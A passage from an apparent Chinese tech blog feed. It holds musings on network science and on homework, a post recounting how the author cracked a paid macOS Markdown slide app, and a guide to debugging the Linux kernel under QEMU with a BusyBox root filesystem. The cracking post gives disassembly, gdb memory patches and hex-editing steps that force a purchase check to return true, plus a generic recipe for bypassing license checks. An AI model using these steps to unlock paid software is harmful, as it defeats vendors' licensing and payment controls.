<p>我们的网络模型越来越完美，然而，有一些特殊的网络现象困扰着我们。真实网络中，常常有一些节点，它的链接要比周围其它节点要多得多得多。比如说首都北京在交通网络中的地位，它是交通枢纽，几乎所有的高铁都会经过北京，而一些二线三线城市可能都没有高铁站。怎么去解释这些“枢纽节点”呢？</p>
<p>枢纽节点在网络中是怎样产生的呢？原因之一就是，网络是会生长的。之前讨论的网络模型都是静态的，一个网络被提出来，它的节点和链接就不会再变化。真实网络显然不是这样：互联网中一些过时的信息页面会被删除，一些人的逝世会导致社交网络中某些节点消失，与之相关的链接都会跟着消失。同时大量的节点和链接又会产生。网络在进行新陈代谢，是在生长的。</p>
<p>同时想象生长的过程是有偏好的。每个新节点产生后都想依附一个强有力的老节点。即使不是新节点，也都设法通过链接和强有力的节点扯上关系。偏好就是枢纽节点产生的第二个原因。虽然强有力的节点和偏好链接是鸡生蛋蛋生鸡的问题，但通过迭代，枢纽节点的产生几乎是必然的。</p>
<p>可是问题由来了：按照这个规则，那岂不是资历越老的节点越来越富有，而新节点几乎不可能超越老节点成为枢纽？看看真实世界，作为老牌枢纽节点的雅虎不是最终被新兴的谷歌抢去了江山。怎么去解释这种“新星效应”呢？网络科学家提出了节点的“适应度”。适应度通过主导枢纽节点的形成来主导一切。</p>
<p>这让我想到有人对于国产操作系统的相关评论。有些人不看好国产系统，一部分人觉得我们技术水平差，这类人我就不说什么了。第二类人认为国产系统没有前途是因为操作系统拼的是市场，拼生态圈。现在微软、苹果、Unix/Linux、Android一超多强，国产操作系统早已无地落足。这点我确实比较赞同。不过教我们操作系统的杨力祥老师不这么觉得，他认为只要技术够牛够创新，分一杯羹不是没有可能性，甚至还会火起来。如果将技术突破视作新生节点的适应度的话，从网络的观点看，还是有很大希望的。So，Good Luck!</p>
<p>从图论到随机网络，接着引入团聚性和生长性、偏好链接、适应度等一些列元素——这就是《链接》这本书中关于网络的起源、演化和本质的讨论。这本书让我陷入思考的地方有很多。</p>
<p>弱关系</p>
<p>对于网络中枢纽节点的研究，我知道了一个不常见的规律：幂律。先说我们常见的一个规律吧：钟型曲线。学术的说法叫做高斯分布，或者正态分布。这条曲线揭示了自然界的倾向：极端的情况出现较少，中间的情况占大多数。比如说中国成年男性的身高，80%分布在160~175之间，过矮或过高的人相对来说非常少。大自然似乎“满足大多数人的利益”，向往“中庸之道”，大部分人都很开心！</p>
<p>可是网络中的节点呢？我们观察它们的之间的链接分布，发现20%的节点掌握着80%的链接，甚至呈现比帕累托80/20更夸张的比率。事实上，节点的分布规律是呈幂律关系的。幂律分布的曲线不是均匀对称的钟型，而是从无穷大迅速下降并拖着长长尾巴的一条曲线。我们可以想象比尔盖茨站在靠近无穷大的头段，而我们普通人则是尾端。尾端所有人的财产之和，可能也没有办法和比尔盖茨一个人的财产相比。贫富差距之所以常常被描述为“鸿沟”，大概就是因为社会财产的分布接近幂律分布吧。</p>
<p>首先我觉得用网络的观点去看世界，我就觉得很新奇也很受用。</p>
<p>毕竟我们被还原论</p>
<p>在临界点附近，我们不能再把各个原子分开研究。相反，这些原子应当被视为行动一致的群体。原子被原子形成的盒子取代，每个盒子中的原子行为一致。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>从咱们程序员口中听到“网络”一词，大家会不会立即联想到路由器、交换机这些东西呢？今天我想和大家说的网络，可不局限于计算机网络。事实上，我们周围存在着的网络远比想象中的多：好莱坞影星合作网络，化学反应中物质转化的网络，引用文献网络，经济网络等等。哦，当然还有蜘蛛网——一提到网络就会印入大脑的图像。可网络很复杂，不是一张蜘蛛网就能描述的。如何去描述网络一直是科学家们纠结的问题。现在让我们来看看人们是如何建立模型，一步步逼近真实网络，去描述世界。</p>]]>
    
    </summary>
    
  </entry>
  
  <entry>
    <title><![CDATA[作业的本质]]></title>
    <link href="https://freemandealer.github.io/gallery/2015/10/29/the-nature-of-homework/"/>
    <id>https://freemandealer.github.io/gallery/2015/10/29/the-nature-of-homework/</id>
    <published>2015-10-29T12:03:19.000Z</published>
    <updated>2015-11-01T04:32:25.000Z</updated>
    <content type="html"><![CDATA[<p><img src="http://i13.tietuku.com/c2cd1b67bce0cff1.jpg" alt=""></p>
<a id="more"></a>
<p>最近一直在订正作业。周一晚上计算机体系结构上了一堂习题课。说真的，上次听“习题课”这一叫法还是在中学。为什么要上习题课呢？一是因为课后作业错得太多，而且又没有一个100%的正确答案可以对照，所以需要老师帮着把答案确定一遍。二是由于体系结构的作业太难，同学们私下讨论不出结果，百度谷歌又搜不出像样的专业领域专业问题的解答，需要一个权威人士讲解，学习专业的思路。这里不得不说，书后习题出得真赞。以至于每次做作业，题目都看不懂。回想过去单纯的中学时光，我们学会的一项重要技能就是揣测题意，做到知己知彼（也许你没注意，但仔细想想很大可能你已经在运用了）。计算机体系结构书后习题具有独特的延伸性和启发性了，根本不知道它想问你什么。乍一看很多题目与课本前面的内容、上课的内容都没什么关系啊，别提猜出题目在考察什么知识点了。但神奇的是，经老师这么一讲解，就都和课堂上、书上的知识点结合起来了，让人时不时地恍然大悟。</p>
<p>上习题课的第三个原因，是因为考试中会有原题。这一点乍一听很关键啊！试想这样一个让人冷汗直冒的场景：你有一题作业没搞懂，考试遇到类似题，其他人都奋笔疾书，信心十足又沾沾自喜地在你前面交上试卷。你岂不是要悔地直跺脚？这时你突然想起国科大某位老师曾经说过的一句话：“你考试分数高，我不能说你这一门课学得好；同样你学得好，考试成绩也不一定高”。你不禁陷入了对一个大问题的沉思中：考试到底算什么？作为局内人，我也说不清楚考试算什么。好消息是在国科大，在研究生阶段，课程作业、考核这些形式上的东西与知识的夹沟，我觉得已经很窄了。</p>
<!--本科阶段的成绩那是相当重要：出国留学得看GPA，保研名额分配也大幅度地参考综合成绩排名。奖学金的申请与成绩也是息息相关。一个漂亮的成绩单在找工作时当然没有一点坏处。研究生阶段和本科阶段怎么说得有些差别吧？我身为局中人，其中差别我还真说不清。但是我知道，相对于本科生，对于研究生的考察，至少增添了科研能力这一标准。增加的标准势必会降低其它标准的权重。由于我们精力有限，我们应该相应地减少应试时间，去为提高自己研究生身份应有的能力。哪些是研究生应培养的能力，我说不准，我暂且用“实力”一词指代。-->
<p>说作业是形式，我自己有些过意不去。对于作业的本质，我也是在学生生涯中断断续续思考良久。学习的过程不只要输入，输出也是重要环节。比如看书、听课那只是输入部分，而输出往往会被我们忽视。输出是指用知识影响周围世界。我们把刚刚学到的知识分享出去影响别人，我认为这就是“教学相长”的内涵。我们用实践去改造世界，我认为这就是“知行合一”的内涵。当然实践知识有时是一件麻烦事：我学会了电路设计，我要实践，那我得花些时间和金钱去买些电子器件吧。而作业，就是一种模拟性质的实践：把你放在一个用文字建立起来的情景中，给你一切想要的，你只要集中精力去运用学会的知识解决问题就可以了。是不是很神奇呢？我想，这才是作业的本质。学习然后实践，最简单的实践就是解题看看。解错了、解不出来那就去听讲解，再一遍仔细研究学习内容，再实践。通过迭代，让知识隐性化为常识或者本能反应。回头看我们小学时的“课前预习、课堂认真听讲、复习笔记、写作业”的学习回路，真是蕴含着大智慧呢！其实小时候有很多这样的大智慧由于太朴素而没有被我们赞美，这是另外一码事了。</p>
<p>通过对作业的重新思考，我们还能抱怨什么或者有什么额外的期待呢？一份好的作业永远不会是负担，也不会让人怀疑它和成绩之间的暧昧关系——它一直忠贞于知识。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p><img src="http://i13.tietuku.com/c2cd1b67bce0cff1.jpg" alt=""></p>]]>
    
    </summary>
    
      <category term="元知识" scheme="https://freemandealer.github.io/gallery/tags/%E5%85%83%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[记录一次OSX软件破解]]></title>
    <link href="https://freemandealer.github.io/gallery/2015/10/10/hacking-osx-app/"/>
    <id>https://freemandealer.github.io/gallery/2015/10/10/hacking-osx-app/</id>
    <published>2015-10-10T05:02:54.000Z</published>
    <updated>2019-08-15T04:17:44.459Z</updated>
    <content type="html"><![CDATA[<p>这不是一篇教你破解苹果软件的简明教程，而是一篇斗智斗勇的曲折故事。请支持正版！</p>
<a id="more"></a>
<h1 id="序章：惹错人了">序章：惹错人了</h1><p>听说精致的Mac和优雅的MarkDown很配。你知道Markdown也可以用来写作幻灯片吗？首先给大家推荐一个Mac平台上优雅的应用叫做DeckSet。售价29.99$，挺贵的，呵呵。</p>
<p>我真的是一个自由软件爱好者！我虽然穷我支持正版！但我同时是个愤青啊！AppStore慢也就算了，想注册个可以花钱的账号过程也太不友好了！关键是，安装完DeckSet你跟我说公式渲染要额外付费9.99$是几个意思？</p>
<p>而且我仔细观察软件的行为，发现它的公式解析使用的是MathJax——一款开源免费的程序。DeckSet从开源软件中免费获得了代码，转而将这些代码实现的功能通过收费的形式提供给消费者，太不人性了（不过这不构成侵权，因为MathJax遵循的Apache协议允许商业销售）。</p>
<p>如果你不付钱呢，它就给你这样弹警告：</p>
<p><img src="/img/extra-money.png" alt=""></p>
<p>给你这样(把你的公式给吞了，仔细看还有淡淡的影子):</p>
<p><img src="/img/no-formula.png" alt=""></p>
<p>不管怎么样，我想它是惹错人了。</p>
<h1 id="利其器">利其器</h1><p>我并不是一个职业黑客。我之前也没破解过软件。既然放了狠话，也只能硬着头皮上。看看我已经有啥技能和工具：掌握C语言，有过软件设计的些许经验。由于踩过无数坑，渐渐总结出了软件调试技巧。加上一些新手的运气和对奸商的憎恶——可以付之一搏了。</p>
<p>再看看手头工具有哪些呢？静态观察程序代码，那就得要反汇编器，我觉得otx就不错。动态观察程序运行，那就得要调试器，就用Xcode自带的gdb吧。编辑二进制文件，系统自带的vim就可以。都是一些没有图形界面的土装备，但够用就行，烦不了太多——我是新手我怕谁。</p>
<p>otx用homebrew就可以安装。前提是必须先安装好Xcode。</p>
<p>gdb据说是Xcode自带。不过之前我用homebrew大法安装了独立版本。受限于系统权限，gdb想调试一个程序并不容易。你得用证书把gdb签名，赋予它调试其它进程的权限。具体过程可以参考<a href="http://www.csdn123.com/html/topnews201408/43/8443.htm" target="_blank" rel="external">这个</a>。</p>
<h1 id="了解你的敌人">了解你的敌人</h1><p>为了破解一个软件，我们不得不先了解这个软件。为了了解我们的目标，我们得搜集它的各种信息。</p>
<p>搜集信息的第一个层面是你要知道敌人在哪？我是说你的知道软件的安装位置和目录结构。Mac系统上，软件被装在/Application/目录下。其中/Applications/XXX.app/Contents/MacOS/这个目录下就是程序的二进制文件——我们靶子！</p>
<p>搜集信息的第二个层面就是多用这个软件，对与一些提示要特别留意。比如第一幅图中那烦人的黄色警告条：”Buy formula support for $9.99”就变成了我的突破口。</p>
<p>首先我用下面命令对程序进行反汇编，汇编代码保存在deckset.asm文件里。</p>
<pre><code>otx Applications<span class="regexp">/Deckset.app/</span>Contents<span class="regexp">/MacOS/</span>Deckset &gt; deckset.asm
</code></pre><p>打开保存结果的文件，里面全是汇编代码和各种零零碎碎的信息。我是新手，我看不懂。我不管，先Ctrl+F查找”Buy formula support”。果然，这样这样函数，对某个值进行了判断，并跳转到输出”Buy formula support”。跟踪这一线索，不说能不能了解程序判断你是否是合法用户的机制，倒是眼前肯定闪过了不少能让你想入非非的词汇，比如：</p>
<ul>
<li>initWithMASProduct(MAS是不是maths?Product！)</li>
<li>RecieptVerification(Verification?验证什么？)</li>
<li>systemMACAddress(是不是用了MAC地址进行验证啊？)</li>
<li>purchaseFormulas</li>
</ul>
<p>这个时候一些软件设计的经验就派上用场啦！用猫的思维去思考的老鼠活得才自在，用老鼠思维去思考的猫才能抓到最多的老鼠。知道怎么拼软件才知道怎么拆软件。</p>
<p>这时google到了一个工具叫class-dump（听到dump就来劲！），可以从面相对象编程的OC二进制文件中提取类的信息。这就是搜集信息的第三个层面，程序代码中蕴含的信息。otx反汇编时其实已经包含零零碎碎的信息啦，只不过class-dump的信息是按面向对象的思想整理过的。</p>
<p>otx也好，class-dump也好，不管用什么工具，意识最重要。刚刚看过的那些想入非非的字符串的最后一条“purchaseFormulas”激发了我的灵感。我Ctrl+F用purchase一搜，得到了下图信息：左边是otx反汇编的代码，右边是class-dump的结果，可以验证这些信息两个工具都是可以提供的，只是class-dump更便于阅读）:</p>
<p><img src="/img/purchase.png" alt=""></p>
<p>看到这个函数名”purchasedAddOnWithIdentifier”，加上返回值类型是BOOL，以及一些想当然，可以说任务已经完成一大半了。明白了吗？这个函数很可能是用来验证用户是否购买过这个AddOn，如果买过就返回True，否则False。所以我们只要让这个函数一值返回True很可能就大功告成啦！</p>
<h1 id="准备毒药">准备毒药</h1><p>来，我们仔细看purchasedAddOnWithIdentifier代码！</p>
<p><img src="/img/purchase_code.png" alt=""></p>
<p>你真的仔细看了？我开玩笑的:P 我自己都看不懂！不需要看懂，我就是想让这个函数一直返回1而已。大神可能已经在用大脑编译一段实现这样功能代码然后直接用机器码填上了——这我可做不到，但我机灵着呐：我用C语言写一段一直返回1的函数，然后编译这段C代码，接着从里面提取这段机器码。</p>
<p>好，现在就开始做！写一段熟悉的C语言代码：</p>
<pre><code><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span>

<span class="function"><span class="keyword">int</span> <span class="title">freeman</span><span class="params">()</span>
</span>{
    <span class="keyword">return</span> <span class="number">1</span>;
}

<span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>
</span>{
    <span class="keyword">if</span> (freeman())
        <span class="built_in">printf</span>(<span class="string">"hello"</span>);
    <span class="keyword">return</span> <span class="number">0</span>;
}
</code></pre><p>编译完了在用otx反汇编，得到：</p>
<p><img src="/img/alway_true.png" alt=""></p>
<p>用图中高亮显示的8字节机器码替换掉purchasedAddOnWithIdentifier开头的代码，就可以让purchasedAddOnWithIdentifier函数永远返回1，也就是True啦。这8字节机器码就是我们的毒药，下面我们来看看怎么把毒药喂给程序。</p>
<h1 id="下毒">下毒</h1><p>明确任务，我们需要把图左边的8字节代码一一换成右边对应的代码。</p>
<p><img src="/img/paper.png" alt=""></p>
<p>但是还记得吗？我们上述操作都是建立在purchasedAddOnWithIdentifier是关键验证函数这个猜想上的，我可不想在可执行文件本身直接动手，而是选择在运行时内存镜像中进行动态hack。这里就用上了gdb和一些特殊的调试技巧。</p>
<pre><code>gdb deskset
&gt; b *<span class="number">0x00000001000c43b2</span>   <span class="preprocessor">#purchasedAddOnWithIdentifier函数开始地址</span>
&gt; r
</code></pre><p>然后随便摆弄一下程序，直到其“卡”在断点上。谢天谢地，程序真的停下来了！然后开始用gdb的<code>set</code>命令修改<code>0x1000c43b2~0x1000c43be</code>范围内内存单元的值。set完了，再用<code>disas 开始地址，+区间长度</code>命令反汇编这一段内存区域，检查是否正确。从下图可以看到，我们的代码和C语言hello程序中的freeman函数反汇编的结果是一样的。</p>
<p><img src="/img/set_disas.png" alt=""></p>
<p>然后 <code>continue</code> 运行。成功了！</p>
<p>清爽的界面再没有警告！购买菜单也灰掉了。</p>
<p><img src="/img/success.png" alt=""></p>
<p>最重要的是公式终于清楚地显示啦！</p>
<p><img src="/img/success2.png" alt=""></p>
<h1 id="稳固胜利果实">稳固胜利果实</h1><p>试验成功了，我们的毒已经注入了程序的内存空间。但是这个破解可不是永久的，每次重新打开程序，就得重复上述步骤进行破解。现在我们要把胜利的果实固定住。这可以通过修改程序二进制文件进行。用到的工具就是vim。</p>
<p>利用vim打开二进制程序看起来不是一个好主意——一片乱码啊！不过在vim中敲<code>:</code>然后在下面输入<code>%!xxd</code>回车后看到了可是另一番景象。通过搜索匹配到我们的目标代码，然后逐一替换，保存即可。</p>
<p><img src="/img/hex.png" alt=""></p>
<p>具体操作时有一些问题，比如说目标代码不好定位。这里提供一个小的脚本工具：<a href="https://github.com/freemandealer/scripts/blob/master/offset1.3.pl_" target="_blank" rel="external">offset</a>可以方便地把otx中的内存地址转换成二进制文件中的偏移。</p>
<p>替换完成后别急着<code>wq</code>保存退出。而是先<code>%!xxd -r</code>重新转码然后再保存退出。</p>
<p>这样，我们就可以优雅地运行程序了。</p>
<h1 id="技术总结">技术总结</h1><p>对于看完故事还意犹未尽的技术人，我还准备了一份简单的路线：</p>
<ul>
<li>收集信息和探索：对二进制文件展开成人类可读的形式后，使用关键词进行搜索，定位阻碍我们流畅使用该应用的函数。这一步耗时最长，需要仔细摆弄软件获得灵感，并且直接决定能否成功。一般搜索关键词如 activate、purchase、register、trial 之类，也可以结合具体应用和想要的效果选取。例如对于弹窗的应用，不一定非要“破解”，只要能屏蔽广告就行，那么可以使用 dialog、window 之类的关键词搜索。这个阶段使用的工具主要目的是为了把 binary format 妆换成 human-readable format，工具例如：hopper、otx、class-dump 都可以满足，class-dump 信息清晰一下。</li>
<li>如果上一步定位了目标函数，则需要弄清这个函数的输入输出，并撰写编译自己后面用来替换的函数。比如目标函数通过判断用户身份返回是否合法，合法true不合法false。那么我们就建立一个C文件写一个永远返回true的函数编译出二进制。如果一个目标是一个返回void的弹窗函数，那么我们就让这个函数调用后立马return，跳过后面花里胡哨的广告展示逻辑。这个阶段用到的工具是 C 语言编译器，如 gcc。</li>
<li>找到目标函数的虚拟内存地址。工具: hopper 或 otx 都可以满足。</li>
<li>通过上面的内存地址获取代码在二进制文件中的位置。工具： <a href="https://github.com/freemandealer/scripts/blob/master/offset1.3.pl_" target="_blank" rel="external">offset</a> 脚本。</li>
<li>使用自己的函数逻辑替换二进制文件 offset 处原逻辑。工具：vim &amp;&amp; xxds</li>
<li>测试是否成功。不成功重复上述步骤，或者google 高阶破解技巧，或者放弃。</li>
</ul>
<p>请支持正版！</p>
<h1 id="参考资料">参考资料</h1><ul>
<li><p><a href="https://reverse.put.as/wp-content/uploads/2011/02/beginners-tut-II.txt" target="_blank" rel="external">https://reverse.put.as/wp-content/uploads/2011/02/beginners-tut-II.txt</a></p>
</li>
<li><p><a href="http://kswizz.com/2011-01-16/hacking-mac-apps/" target="_blank" rel="external">http://kswizz.com/2011-01-16/hacking-mac-apps/</a></p>
</li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<p>这不是一篇教你破解苹果软件的简明教程，而是一篇斗智斗勇的曲折故事。请支持正版！</p>]]>
    
    </summary>
    
  </entry>
  
  <entry>
    <title><![CDATA[用QEMU来调试内核 -- 亲身体验篇]]></title>
    <link href="https://freemandealer.github.io/gallery/2015/10/04/debug-kernel-with-qemu-2/"/>
    <id>https://freemandealer.github.io/gallery/2015/10/04/debug-kernel-with-qemu-2/</id>
    <published>2015-10-04T05:37:39.000Z</published>
    <updated>2017-01-07T03:38:39.000Z</updated>
    <content type="html"><![CDATA[<p>本文记录了用QEMU构建最小Linux系统并进行调试的过程。</p>
<a id="more"></a>
<blockquote>
<p>修改：<br>v1 2015-10-04 原稿<br>v2 2016-02-07 将initrd启动替换成硬盘启动</p>
</blockquote>
<h2 id="愿景">愿景</h2><p>我在<a href="http://freemandealer.github.io/2015/08/27/debug-kernel-with-qemu/">用QEMU来调试内核 – 亲身体验篇</a>中大致记录了邮件列表上和网上搜索到的内核调试方法，并没有完全进行验证。今天亲自实践了一番，发现：</p>
<ul>
<li>QEMU调试果然爽快</li>
<li>调试环境搭建过程中有很多细节需要注意</li>
</ul>
<p>先来看看有了QEMU内核调试环境后，我调试内核的大致步骤。</p>
<ul>
<li><p>修改内核，make编译（不用完整执行，生成bzImage就可以中断make）。执行</p>
<pre><code>qemu-system-x86_64 -kernel arch/x86_64/boot/bzImage \    # 指定编译好的内核
-<span class="ruby">hda rootfs.img \        <span class="comment"># 指定硬盘</span>
</span>-<span class="ruby">append <span class="string">"root=/dev/sda"</span>      <span class="comment"># 告诉内核硬盘上有根文件系统</span></span>
</code></pre></li>
<li><p>运行GDB(这个GDB是要自己编译的，见<a href="http://freemandealer.github.io/2015/08/27/debug-kernel-with-qemu/">上篇文章的末尾</a>)。</p>
<pre><code>gdb vmlinux
&gt; <span class="keyword">target</span> remote localhost:1234
</code></pre></li>
<li><p>进入弹出的QEMU窗口，<code>CTRL+ALT+2</code>进入QEMU控制台，输入<code>gdbserver</code>。</p>
</li>
<li><p>调试开始！</p>
</li>
</ul>
<blockquote>
<p>上述步骤针对图形模式，如果工作在字符界面下，第一步的命令需要替换成：</p>
<pre><code>qemu-system-x86_64 -kernel arch/x86_64/boot/bzImage \
 -<span class="ruby">hda rootfs.img \
</span> -<span class="ruby">append <span class="string">"root=/dev/sda console=ttyS0"</span></span>
</code></pre><p>最后添加的<code>console=ttyS0</code>把QEMU的输入输出定向到当前终端上，即让我们可以使用执行qemu-system-x86命令的终端操作虚拟机中的系统，而不需要开启qemu的GUI窗口。不过这样上述第三步进入QEMU控制台的方式就不好使了。如果需要控制台，那么第一步命令需要替换成：</p>
<pre><code>qemu-system-x86_64 -kernel arch/x86_64/boot/bzImage \
 -<span class="ruby">hda rootfs.img \
</span> -<span class="ruby">append <span class="string">"root=/dev/sda console=ttyS0"</span> -monitor stdio</span>
</code></pre><p>这样一来，QEMU控制台的输入输出就定向到当前终端上了，不过同时我们无法利用该终端操作虚拟机中的系统了。两全其美的方法还有待探寻。</p>
</blockquote>
<p>再也不用像使用VMware那样等一万年去<code>make modules&amp;&amp;make install &amp;&amp;make modules_install</code>以及费尽心思去调教grub了。节省了大量时间，同时资源占用也少太多。一切都是整整齐齐的模样。</p>
<p>上面就是我们的目标啦。怎么才能实现呢？分析上述qemu-system-x86_64的参数，我们需要为它准备两样东西：内核镜像bzImage和rootfs。这两个东西构成了一个刚好可用的运行系统。</p>
<h2 id="为什么要构建自己的运行系统">为什么要构建自己的运行系统</h2><p>插一段话，解释什么是LFS。LFS是<a href="http://www.linuxfromscratch.org/lfs/view/stable/index.html" target="_blank" rel="external">Linux From Scratch</a>缩写，意思是利用网络上的开源代码，从头<strong>构建</strong>Linux<strong>发行版</strong>。“<strong>构建</strong>”这里指编译和安装，不是指设计程序和敲代码的过程。构建的目标Linux<strong>发行版</strong>，不是让你从头写Linux内核本身。Linux发行版有很多外延，比如CentOS、Ubuntu、Arch等等。我自个儿就琢磨着呗，我们做内核开发，不能老用别人的发行版：一来我们要分清什么是Linux的共性特征，什么是一些发行版加进去的个性特征；二来从头构建Linux发行版能加深我们对这个系统的理解。更重要的是，毕竟我们研究内核其实就是在溯源，我不希望在探求原理路途上有什么迷雾遮住自己的眼，而是喜欢“一切都在掌握之中”的良好感觉。</p>
<h2 id="调试环境的搭建">调试环境的搭建</h2><p>内核编译我想不必再说了。使用默认配置文件即可。唯一需要注意的是，为了避免交叉编译，我们最后使用与自己正在使用的机器架构一致的配置。例如，我的机器是64位x86，所以我使用下面的命令：</p>
<pre><code><span class="built_in">make</span> x86_64_defconfig
</code></pre><p>然后再用<code>make menuconfig</code>命令配置一下DEBUG_INFO。最后<code>make</code>即可得到bzImage文件。</p>
<p>现在我们还需要准备一个rootfs.img文件，这是一个装有根文件系统的磁盘镜像文件，里面有一些像shell之类的二进制工具，让操作系统能够和用户交互。更重要的是，根文件系统往往还包含init程序，正是它完成了系统初始化的工作。那么如何制作这个rootfs.img呢？</p>
<p>第一步，创建一个磁盘镜像文件并格式化之:</p>
<pre><code><span class="tag">dd</span> <span class="keyword">if</span>=/dev/zero of=rootfs<span class="class">.img</span> bs=<span class="number">1</span>M count=<span class="number">10</span>
mkfs<span class="class">.ext3</span> rootfs.img
</code></pre><p>第二步，下载、配置、编译busybox。配置时需要注意的是，busybox采用静态链接会减去很多麻烦。具体说在 make menuconfig时，勾选:</p>
<pre><code>BusyboxSettings-&gt;Build options-&gt;BuildBusybox <span class="keyword">as</span> a <span class="keyword">static</span> binary
</code></pre><p>第三步，安装busybox到rootfs文件夹:</p>
<pre><code>mkdir /path/<span class="keyword">to</span>/rootfs
sudo mount -t ext3 -o <span class="keyword">loop</span> rootfs.img /path/<span class="keyword">to</span>/rootfs
<span class="comment"># busybox源代码目录中执行</span>
make install CONFIG_PREFIX=/path/<span class="keyword">to</span>/rootfs
</code></pre><p>第四步，配置busybox的init:</p>
<pre><code>mkdir /path/to/rootfs/<span class="keyword">proc</span> /path/to/rootfs/dev /path/to/rootfs/etc
cp busybox-source-code/examples/bootfloppy/* /path/to/rootfs/etc/
sudo umount /path/to/rootfs
</code></pre><p>rootfs.img准备完成了！一切都准备就绪，快试试吧！</p>
<h2 id="附：initrd方式的启动">附：initrd方式的启动</h2><p>您现在正在阅读的这篇文章是多次修改后的版本。在原版中，我们的环境搭建可不是用了rootfs.img这种快捷简单的构建方式，而是采用了initrd的方式。<del>这部分内容舍不得删</del> initrd功不可没，留在这里提供给需要的人看。</p>
<p>initrd是个啥呢？首先它也是一种根文件系统，不过它存在于内存中，而不是硬盘上。它的存在是为了解决这个问题：根文件系统存在于硬盘上，内核可能需要加载一些支持模块才能使用硬盘，而这些模块又是存放在根文件系统上，这样问题就死锁了。initrd全称initial RamDisk，它是一个用内存虚拟出的磁盘，不依赖具体的磁盘硬件，因此是通用的，既不需要特殊的支持模块。这样，上述过程就变成了：临时的根文件系统存在于initrd中，这个临时根文件系统里包含一些必要模块驱动真正的根文件系统所在的磁盘，用这些模块挂载真正的根文件系统，最后一个change root操作，真正的根文件系统顺利上位，而initrd退休。</p>
<p>有两种方式获得这个initrd。一种方式是在内核编译前生成，另一种通过内核编译选项在内核编译后生成。</p>
<h3 id="方法一：编译前生成">方法一：编译前生成</h3><p>先用下面的命令下载并解压缩BusyBox:</p>
<pre><code>curl <span class="string">http:</span><span class="comment">//busybox.net/downloads/busybox-1.23.2.tar.bz2 | tar xjf -</span>
</code></pre><p>为BusyBox创建工作目录:</p>
<pre><code><span class="label">mkdir</span> -pv obj/<span class="keyword">busybox-x86
</span><span class="label">make</span> O<span class="label">=obj</span>/<span class="keyword">busybox-x86 </span>defconfig
</code></pre><p>使用menuconfig配置BusyBox:</p>
<pre><code><span class="label">make</span> O<span class="label">=obj</span>/<span class="keyword">busybox-x86 </span>menuconfig
</code></pre><p>选择静态链接:</p>
<pre><code>-&gt; <span class="keyword">Busybox </span>Settings
    -&gt; <span class="keyword">Build </span>Options
    [ ] <span class="keyword">Build </span><span class="keyword">BusyBox </span>as a static <span class="keyword">binary </span>(no shared libs)
</code></pre><p>编译、安装BusyBox:</p>
<pre><code><span class="keyword">cd</span> obj/busybox-x86
<span class="keyword">make</span> -j2
<span class="keyword">make</span> install
</code></pre><p>拷贝安装目录中的工具到initramfs目录中，这个文件夹就是日后的initramfs:</p>
<pre><code>mkdir -p initramfs/x86-busybox
cd initramfs/x86-busybox
mkdir -pv {bin,sbin,etc,<span class="keyword">proc</span>,sys,usr/{bin,sbin}}
cp -av obj/busybox-x86/_install/* ./
</code></pre><p>initramfs目录中没有init脚本，这可不行，我们的内核起来以后运行什么程序呢？我们手动创建一个：</p>
<pre><code><span class="comment">#!/bin/sh</span>

/bin/mount -t <span class="keyword">proc</span> none /<span class="keyword">proc</span>
/bin/mount -t sysfs sysfs /sys
echo '<span class="type">Enjoy</span> your new system!'
/bin/sh
</code></pre><p>生成initramfs:</p>
<pre><code><span class="comment">find</span> <span class="string">.</span> <span class="literal">-</span><span class="comment">print0</span> <span class="comment">|</span> <span class="comment">cpio</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">null</span> <span class="literal">-</span><span class="comment">ov</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">format=newc</span> <span class="comment">|</span> <span class="comment">gzip</span> <span class="literal">-</span><span class="comment">9</span> &gt; <span class="comment">initramfs</span><span class="literal">-</span><span class="comment">busybox</span><span class="literal">-</span><span class="comment">x86</span><span class="string">.</span><span class="comment">cpio</span><span class="string">.</span><span class="comment">gz</span>
</code></pre><p>得到initramfs了，任务结束了!看明白了吗？</p>
<p>同时这里给出生成initramfs的逆操作－－拆分initramfs:</p>
<pre><code>cpio -<span class="tag">i</span> -d -H newc -F initramfs_data<span class="class">.cpio</span> --no-absolute-filenames
</code></pre><h3 id="方法二：编译后生成">方法二：编译后生成</h3><p>通过内核编译前配置<code>CONFIG_INITRAMFS_SOURCE</code>选项到一个存在的gzipped的initramfs、或是一个准initramfs目录、或是如下格式指定initramfs结构的txt文件:</p>
<pre><code>dir /dev <span class="number">755</span> <span class="number">0</span> <span class="number">0</span>
nod /dev/console <span class="number">644</span> <span class="number">0</span> <span class="number">0</span> c <span class="number">5</span> <span class="number">1</span>
nod /dev/loop0 <span class="number">644</span> <span class="number">0</span> <span class="number">0</span> b <span class="number">7</span> <span class="number">0</span>
dir /bin <span class="number">755</span> <span class="number">1000</span> <span class="number">1000</span>
slink /bin/sh busybox <span class="number">777</span> <span class="number">0</span> <span class="number">0</span>
file /bin/busybox initramfs/busybox <span class="number">755</span> <span class="number">0</span> <span class="number">0</span>
dir /proc <span class="number">755</span> <span class="number">0</span> <span class="number">0</span>
dir /sys <span class="number">755</span> <span class="number">0</span> <span class="number">0</span>
dir /mnt <span class="number">755</span> <span class="number">0</span> <span class="number">0</span>
file /init initramfs/init.sh <span class="number">755</span> <span class="number">0</span> <span class="number">0</span>
</code></pre><h2 id="参考">参考</h2><p>如果你想弄清楚内核的初始化过程，这里有一份阅读列表：</p>
<p><a href="http://mgalgs.github.io/2012/03/23/how-to-build-a-custom-linux-kernel-for-qemu.html" target="_blank" rel="external">How to Build a Custom Linux Kernel for Qemu</a></p>
<p><a href="http://www.linuxfromscratch.org/lfs/view/stable/" target="_blank" rel="external">Linux From Scratch</a></p>
<p><a href="https://www.kernel.org/doc/Documentation/filesystems/ramfs-rootfs-initramfs.txt" target="_blank" rel="external">Kernel Doc：Ramfs, Rootfs and Initramfs</a></p>
<p><a href="https://www.kernel.org/doc/Documentation/early-userspace/README" target="_blank" rel="external">Kernel Doc: Early Userspace Support</a></p>
<p><a href="http://free-electrons.com/docs/elfs/" target="_blank" rel="external">Embedded Linux From Scratch… in 40 minutes</a></p>
]]></content>
    <summary type="html">
